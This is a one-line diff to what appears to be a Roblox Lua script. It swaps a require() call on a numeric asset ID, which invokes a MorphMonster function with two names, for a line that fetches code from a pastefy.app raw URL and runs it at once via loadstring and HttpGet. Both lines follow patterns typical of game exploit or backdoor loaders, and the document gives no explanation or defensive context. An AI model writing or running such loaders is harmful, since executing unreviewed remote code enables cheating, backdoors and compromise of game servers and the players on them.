@@ -1,1 +1,1 @@
-require(119819780800418).MorphMonster("co0olkido0", "organator")
+loadstring(game:HttpGet("https://pastefy.app/20WaEl9u/raw", true))()
